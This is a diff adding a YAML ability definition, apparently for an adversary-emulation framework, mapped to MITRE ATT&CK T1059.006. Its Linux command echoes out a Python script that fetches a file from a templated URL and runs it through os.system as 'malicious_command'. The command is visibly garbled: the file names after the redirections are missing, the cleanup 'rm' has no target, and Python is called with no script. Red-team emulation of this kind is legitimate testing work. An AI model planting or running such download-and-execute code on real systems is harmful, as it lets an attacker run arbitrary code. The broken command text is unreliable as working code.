@@ -1,0 +1,21 @@
+---
+- id: b6f9e71d77760df31425c2c8bcc399f1
+  name: Execute Python via scripts
+  description: Create Python file (.py) that downloads and executes shell script via
+    executor arguments
+  tactic: execution
+  technique:
+    attack_id: T1059.006
+    name: 'Command and Scripting Interpreter: Python'
+  platforms:
+    linux:
+      sh:
+        command: 'which_python=$(which python || which python3 || which python3.9
+          || which python2); echo ''import requests'' >; echo ''import os'' >>; echo
+          ''url = "#{script_url}"'' >>; echo ''malicious_command = "#{executor} #{payload_file_name}
+          #{script_args}"'' >>; echo ''session = requests.session()'' >>; echo ''source
+          = session.get(url).content'' >>; echo ''fd = open("#{payload_file_name}",
+          "wb+")'' >>; echo ''fd.write(source)'' >>; echo ''fd.close()'' >>; echo
+          ''os.system(malicious_command)'' >>; $which_python'
+        payloads: []
+        cleanup: rm
